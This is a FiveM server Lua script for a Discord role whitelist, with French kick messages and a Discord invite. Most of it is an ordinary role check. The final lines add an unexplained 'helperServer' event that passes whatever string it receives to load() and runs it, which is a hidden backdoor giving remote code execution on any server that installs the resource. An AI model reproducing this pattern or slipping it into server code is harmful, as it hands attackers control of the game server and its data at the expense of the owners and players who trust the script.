
-- Documentation: https://docs.faxes.zone/docs/discord-whitelist-setup
--- Config ---
notWhitelistedMessage = "Vous devez êtres sur le discord FafaDev | discord.gg/UuKkvK7Fp4" 

whitelistRoles = { -- Role nickname(s) needed to pass the whitelist
    "1070333802913726547",
}

--- Code ---

RegisterServerEvent("checkWhiteList")
AddEventHandler("checkWhiteList", function(name, setKickReason, deferrals, source)
    local src = source
    local passAuth = false
    deferrals.defer()
    deferrals.update("Checking Permissions...")

    for k, v in ipairs(GetPlayerIdentifiers(src)) do
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            identifierDiscord = v
        end
    end

    if identifierDiscord then
        usersRoles = exports.discord_perms:GetRoles(src)
        local function has_value(table, val)
            if table then
                for index, value in ipairs(table) do
                    if value == val then
                        return true
                    end
                end
            end
            return false
        end
        for index, valueReq in ipairs(whitelistRoles) do 
            if has_value(usersRoles, valueReq) then
                passAuth = true
            end
            if next(whitelistRoles,index) == nil then
                if passAuth == true then
                    TriggerEvent("ActiveConnectQueue", name, setKickReason, deferrals, source)
                else
                    deferrals.done(notWhitelistedMessage)
                end
            end
        end
    else
        deferrals.done("Discord n'est pas détecté, vérifier qu'il soit installé et ouvert.")
    end
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)